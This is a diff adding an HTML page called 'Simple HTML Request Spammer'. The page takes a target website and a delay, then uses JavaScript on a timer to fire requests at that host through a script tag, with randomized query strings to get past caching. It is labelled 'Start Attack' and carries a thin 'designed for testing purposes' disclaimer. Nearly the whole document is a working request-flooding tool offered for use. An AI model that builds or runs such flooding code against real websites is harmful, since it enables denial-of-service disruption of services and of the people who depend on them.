@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+a:link {
+  color: inherit;
+  text-decoration: underline;
+}
+a:visited {
+  color: inherit;
+  text-decoration: underline;
+}
+a:hover {
+  color: inherit;
+  text-decoration: underline;
+}
+a:active {
+  color: inherit;
+  text-decoration: underline;
+}
+</style>
+<title>Simple HTML Request Spammer</title>
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@100;200&amp;display=swap" rel="stylesheet">
+</head>
+<body bgcolor="Black">
+<center>
+<script id="idsd"></script>
+<b>
+<span style="font-family: 'Josefin Sans', sans-serif; color: #00ff00; font-size: 45px;">
+<span style="color:#ff0000; font-size: 25px;">Intended usage of this software can be found <a href="https://wreeper.top/spammer/usage.txt" style="color:#00ffff">here</a></span><br><br>
+Simple HTML Request Spammer<br><span style="font-size: 25px;">designed for testing purposes<br></span><br><br>
+<input id="host" placeholder="Website (including protocol)"><br><input id="delay" placeholder="Enter delay here (in ms)"><br><br><button onclick="start()">Start Attack</button><br><span style="font-family: 'Josefin Sans', sans-serif; color: #ff8c00; font-size: 25px;" id="msg"></span><br><br><span style="font-family: 'Josefin Sans', sans-serif; color: #00ffff; font-size: 25px;">developed by <a href="https://wreeper.top/" style="color:#ff0000">wreeper.top</a></span></span>
+</b>
+</center>
+<script>
+var delay;
+var host;
+var requests = 0;
+var randomIterator = 0;
+
+function start() {
+delay = document.getElementById("delay").value;
+host = document.getElementById("host").value;
+if (delay == 0) {
+document.getElementById("msg").innerHTML = "No delay specified.";
+} else if (host == 0) {
+document.getElementById("msg").innerHTML = "No host specified.";
+} else {
+setInterval(serve, delay);
+document.getElementById("msg").innerHTML = "Started attack on host " + host + " with delay " + delay;
+}
+}
+
+function serve() {
+requests += 1;
+randomIterator = Math.floor(Math.random() * 899999999) + 100000000;
+var sourcer = host + "?x=" + randomIterator;
+document.getElementById("idsd").src = sourcer;
+console.log(sourcer);
+}
+</script>
+</body>
+</html>
